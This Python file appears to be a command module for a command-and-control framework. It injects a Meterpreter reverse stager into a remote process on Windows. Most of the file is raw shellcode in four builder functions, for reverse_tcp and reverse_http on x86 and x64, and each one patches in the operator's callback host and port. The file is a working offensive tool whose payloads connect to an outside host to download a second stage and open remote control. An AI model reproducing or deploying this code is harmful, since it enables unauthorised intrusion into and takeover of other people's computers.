from CommandBase import *
import json
from MythicFileRPC import *


class MeterpreterArguments(TaskArguments):

    VALID_ARCHITECTURES = ["x64", "x86"]
    VALID_PAYLOAD_TYPES = ["reverse_tcp", "reverse_http", "reverse_https"]

    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "pid": CommandParameter(name="PID", type=ParameterType.Number),
            "payload_type": CommandParameter(name="Payload Type", type=ParameterType.ChooseOne, choices=self.VALID_PAYLOAD_TYPES),
            "arch": CommandParameter(name="Architecture", type=ParameterType.ChooseOne, choices=self.VALID_ARCHITECTURES),
            "lhost": CommandParameter(name="LHOST", type=ParameterType.String),
            "lport": CommandParameter(name="LPORT", type=ParameterType.Number)
        }

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("No arguments given.\n\tUsage: {}".format(MeterpreterCommand.help_cmd))
        if self.command_line[0] != "{":
            raise Exception("Require JSON blob, but got raw command line.\n\tUsage: {}".format(MeterpreterCommand.help_cmd))
        self.load_args_from_json_string(self.command_line)

        # Verify architecture type
        if self.get_arg("arch") is None or self.get_arg("arch").lower() not in self.VALID_ARCHITECTURES:
            raise Exception("Invalid Architecture Type. Choices: x86, x64")

        # Verify payload type
        if self.get_arg("payload_type") is None or self.get_arg("payload_type").lower() not in self.VALID_PAYLOAD_TYPES:
            raise Exception("Invalid Payload Type. Choices: reverse_tcp, reverse_http, reverse_https")


class MeterpreterCommand(CommandBase):
    cmd = "meterpreter"
    needs_admin = False
    help_cmd = "meterpreter (modal popup)"
    description = "Inject a meterpreter reverse stager into a remote process."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = False
    is_upload_file = False
    is_remove_file = False
    author = "@reznok"
    argument_class = MeterpreterArguments
    attackmapping = []

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = None


        ###
        # x86 Payload Generation
        ###
        if task.args.get_arg("arch").lower() == "x86":

            # reverse_tcp

            if task.args.get_arg("payload_type").lower() == "reverse_tcp":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_tcp_86(task.args.get_arg("lhost"),
                                                     task.args.get_arg("lport")))

            # reverse_http

            if task.args.get_arg("payload_type").lower() == "reverse_http":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_http_86(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))

        ###
        # x64 Payload Generation
        ###
        if task.args.get_arg("arch").lower() == "x64":

            # reverse_tcp

            if task.args.get_arg("payload_type").lower() == "reverse_tcp":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_tcp_64(task.args.get_arg("lhost"),
                                                     task.args.get_arg("lport")))

            # reverse_http

            if task.args.get_arg("payload_type").lower() == "reverse_http":
                resp = await MythicFileRPC(task).register_file(
                    build_meterpreter_reverse_http_64(task.args.get_arg("lhost"),
                                                      task.args.get_arg("lport")))


        # Remove args that are unused by remote agent
        task.args.remove_arg("lhost")
        task.args.remove_arg("lport")
        task.args.remove_arg("arch")
        task.args.remove_arg("payload_type")

        if resp is None:
            raise Exception("Error getting MythicRileRPC response")

        if resp.status == MythicStatus.Success:
            task.args.add_arg("shellcode", resp.agent_file_id)
        else:
            raise Exception(f"Failed to host sRDI loader stub: {resp.error_message}")

        return task

    async def process_response(self, response: AgentResponse):
        pass


def get_hex_ip(IP):
    return bytearray.fromhex(("".join(format(int(octet), "02x") for octet in IP.split("."))))

###
# x64 Payloads
###


def build_meterpreter_reverse_tcp_64(IP, port):
    """
    Generate shellcode for windows/x64/meterpreter/reverse_tcp

    """

    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x51\x48\x31\xd2\x65\x48\x8b\x52\x60\x56\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
    buf += b"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66"
    buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
    buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50"
    buf += b"\x44\x8b\x40\x20\x49\x01\xd0\x8b\x48\x18\xe3\x56\x48"
    buf += b"\xff\xc9\x41\x8b\x34\x88\x4d\x31\xc9\x48\x01\xd6\x48"
    buf += b"\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75"
    buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    buf += b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
    buf += b"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
    buf += b"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f"
    buf += b"\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0"
    buf += b"\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00"
    # PORT
    buf += port.to_bytes(2, 'big')

    # IP
    buf += get_hex_ip(IP)

    buf += b"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba"
    buf += b"\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00"
    buf += b"\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x41"
    buf += b"\x5e\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48"
    buf += b"\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf"
    buf += b"\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2"
    buf += b"\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x85\xc0"
    buf += b"\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00\x48"
    buf += b"\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
    buf += b"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8"
    buf += b"\x00\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41"
    buf += b"\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31"
    buf += b"\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49"
    buf += b"\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89"
    buf += b"\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d"
    buf += b"\x28\x58\x41\x57\x59\x68\x00\x40\x00\x00\x41\x58\x6a"
    buf += b"\x00\x5a\x41\xba\x0b\x2f\x0f\x30\xff\xd5\x57\x59\x41"
    buf += b"\xba\x75\x6e\x4d\x61\xff\xd5\x49\xff\xce\xe9\x3c\xff"
    buf += b"\xff\xff\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xb4"
    buf += b"\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2\xf0\xb5\xa2"
    buf += b"\x56\xff\xd5"

    return buf


def build_meterpreter_reverse_http_64(IP, port):
    """
    Generate shellcode for windows/x64/meterpreter/reverse_http
    """

    buf = b""
    buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41"
    buf += b"\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60\x48"
    buf += b"\x8b\x52\x18\x48\x8b\x52\x20\x48\x0f\xb7\x4a\x4a\x48"
    buf += b"\x8b\x72\x50\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c"
    buf += b"\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52"
    buf += b"\x48\x8b\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66"
    buf += b"\x81\x78\x18\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80"
    buf += b"\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x8b"
    buf += b"\x48\x18\x50\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    buf += b"\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88\x48\x01\xd6\x48"
    buf += b"\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1\x38\xe0\x75"
    buf += b"\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
    buf += b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b"
    buf += b"\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
    buf += b"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48"
    buf += b"\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
    buf += b"\x12\xe9\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe"
    buf += b"\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1"
    buf += b"\x49\xc7\xc2\x4c\x77\x26\x07\xff\xd5\x53\x53\x48\x89"
    buf += b"\xe1\x53\x5a\x4d\x31\xc0\x4d\x31\xc9\x53\x53\x49\xba"
    buf += b"\x3a\x56\x79\xa7\x00\x00\x00\x00\xff\xd5\xe8\x0f\x00"
    buf += b"\x00\x00"
    buf += IP.encode()
    buf += b"\x00\x5a\x48\x89\xc1\x49\xc7\xc0"
    buf += port.to_bytes(2, 'little')
    buf += b"\x00\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57"
    buf += b"\x89\x9f\xc6\x00\x00\x00\x00\xff\xd5\xe8\xa2\x00\x00"
    buf += b"\x00\x2f\x56\x41\x30\x6c\x4e\x6f\x6e\x6d\x35\x65\x67"
    buf += b"\x54\x4d\x42\x49\x79\x54\x49\x54\x76\x6f\x77\x6f\x64"
    buf += b"\x34\x4c\x67\x33\x53\x6d\x69\x63\x31\x35\x48\x4a\x57"
    buf += b"\x2d\x30\x45\x4a\x44\x78\x4e\x70\x51\x71\x75\x61\x7a"
    buf += b"\x33\x6a\x6a\x32\x4c\x77\x5a\x71\x44\x6c\x35\x72\x41"
    buf += b"\x65\x2d\x48\x4a\x46\x6f\x61\x4f\x57\x74\x6b\x6a\x4b"
    buf += b"\x47\x55\x4e\x70\x39\x6e\x34\x6c\x32\x4d\x46\x43\x6a"
    buf += b"\x6c\x39\x49\x54\x6b\x38\x4e\x77\x48\x63\x6b\x48\x4f"
    buf += b"\x6a\x30\x30\x75\x77\x7a\x44\x54\x58\x41\x66\x41\x5f"
    buf += b"\x64\x76\x43\x37\x7a\x6a\x50\x47\x56\x69\x76\x71\x39"
    buf += b"\x77\x79\x5f\x38\x30\x69\x5a\x45\x75\x6e\x76\x4a\x35"
    buf += b"\x64\x50\x4f\x59\x51\x52\x37\x64\x52\x64\x46\x37\x79"
    buf += b"\x50\x52\x54\x71\x72\x56\x00\x48\x89\xc1\x53\x5a\x41"
    buf += b"\x58\x4d\x31\xc9\x53\x48\xb8\x00\x02\x28\x84\x00\x00"
    buf += b"\x00\x00\x50\x53\x53\x49\xc7\xc2\xeb\x55\x2e\x3b\xff"
    buf += b"\xd5\x48\x89\xc6\x6a\x0a\x5f\x53\x5a\x48\x89\xf1\x4d"
    buf += b"\x31\xc9\x4d\x31\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18"
    buf += b"\x7b\xff\xd5\x85\xc0\x75\x1f\x48\xc7\xc1\x88\x13\x00"
    buf += b"\x00\x49\xba\x44\xf0\x35\xe0\x00\x00\x00\x00\xff\xd5"
    buf += b"\x48\xff\xcf\x74\x02\xeb\xcc\xe8\x55\x00\x00\x00\x53"
    buf += b"\x59\x6a\x40\x5a\x49\x89\xd1\xc1\xe2\x10\x49\xc7\xc0"
    buf += b"\x00\x10\x00\x00\x49\xba\x58\xa4\x53\xe5\x00\x00\x00"
    buf += b"\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1"
    buf += b"\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49\x89\xf9"
    buf += b"\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5\x48"
    buf += b"\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3"
    buf += b"\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2"
    buf += b"\xf0\xb5\xa2\x56\xff\xd5"

    return buf

###
# x86 Payloads
###


def build_meterpreter_reverse_tcp_86(IP, port):
    """
    Generate shellcode for windows/meterpreter/reverse_tcp
    """

    buf = b""
    buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"
    buf += b"\x52\x30\x8b\x52\x0c\x8b\x52\x14\x31\xff\x0f\xb7\x4a"
    buf += b"\x26\x8b\x72\x28\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
    buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x8b\x52\x10\x57"
    buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
    buf += b"\xd0\x8b\x58\x20\x50\x01\xd3\x8b\x48\x18\x85\xc9\x74"
    buf += b"\x3c\x31\xff\x49\x8b\x34\x8b\x01\xd6\x31\xc0\xc1\xcf"
    buf += b"\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
    buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
    buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
    buf += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8\xff"
    buf += b"\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80"
    buf += b"\x6b\x00\xff\xd5\x6a\x0a\x68"
    buf += get_hex_ip(IP)
    buf += b"\x68\x02\x00"
    buf += port.to_bytes(2, 'big')
    buf += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50"
    buf += b"\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68"
    buf += b"\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08"
    buf += b"\x75\xec\xe8\x67\x00\x00\x00\x6a\x00\x6a\x04\x56\x57"
    buf += b"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b"
    buf += b"\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58"
    buf += b"\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
    buf += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68"
    buf += b"\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
    buf += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c"
    buf += b"\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01"
    buf += b"\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
    buf += b"\x53\xff\xd5"

    return buf


def build_meterpreter_reverse_http_86(IP, port):
    """
    Generate shellcode for windows/meterpreter/reverse_http
    """

    buf = b""
    buf += b"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30"
    buf += b"\x8b\x52\x0c\x8b\x52\x14\x89\xe5\x8b\x72\x28\x31\xff"
    buf += b"\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20"
    buf += b"\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52\x57\x8b\x52\x10"
    buf += b"\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01"
    buf += b"\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3\x85\xc9\x74"
    buf += b"\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31\xc0\xac\xc1"
    buf += b"\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d"
    buf += b"\x24\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b"
    buf += b"\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
    buf += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x6e\x65\x74\x00\x68"
    buf += b"\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31"
    buf += b"\xdb\x53\x53\x53\x53\x53\xe8\x3e\x00\x00\x00\x4d\x6f"
    buf += b"\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69"
    buf += b"\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b"
    buf += b"\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b"
    buf += b"\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b"
    buf += b"\x65\x20\x47\x65\x63\x6b\x6f\x00\x68\x3a\x56\x79\xa7"
    buf += b"\xff\xd5\x53\x53\x6a\x03\x53\x53\x68"
    buf += port.to_bytes(2, 'little')
    buf += b"\x00\x00"
    buf += b"\xe8\xdc\x00\x00\x00\x2f\x62\x30\x47\x6e\x47\x42\x31"
    buf += b"\x41\x6a\x57\x4f\x49\x65\x34\x6c\x36\x31\x38\x39\x2d"
    buf += b"\x6e\x41\x39\x66\x6c\x70\x43\x6e\x41\x32\x71\x51\x51"
    buf += b"\x56\x6f\x73\x6c\x35\x4f\x32\x6b\x39\x43\x68\x66\x73"
    buf += b"\x37\x6b\x57\x73\x5f\x73\x30\x47\x31\x61\x49\x41\x68"
    buf += b"\x66\x44\x77\x43\x2d\x37\x51\x54\x51\x37\x45\x79\x4c"
    buf += b"\x6c\x71\x79\x33\x61\x72\x66\x63\x4b\x45\x2d\x5f\x58"
    buf += b"\x38\x2d\x52\x51\x53\x6b\x52\x65\x4d\x39\x00\x50\x68"
    buf += b"\x57\x89\x9f\xc6\xff\xd5\x89\xc6\x53\x68\x00\x02\x68"
    buf += b"\x84\x53\x53\x53\x57\x53\x56\x68\xeb\x55\x2e\x3b\xff"
    buf += b"\xd5\x96\x6a\x0a\x5f\x53\x53\x53\x53\x56\x68\x2d\x06"
    buf += b"\x18\x7b\xff\xd5\x85\xc0\x75\x14\x68\x88\x13\x00\x00"
    buf += b"\x68\x44\xf0\x35\xe0\xff\xd5\x4f\x75\xe1\xe8\x4b\x00"
    buf += b"\x00\x00\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40"
    buf += b"\x00\x53\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89"
    buf += b"\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89"
    buf += b"\xe2\xff\xd5\x85\xc0\x74\xcf\x8b\x07\x01\xc3\x85\xc0"
    buf += b"\x75\xe5\x58\xc3\x5f\xe8\x7f\xff\xff\xff"
    buf += IP.encode()
    buf += b"\x00\xbb"
    buf += b"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5"

    return buf
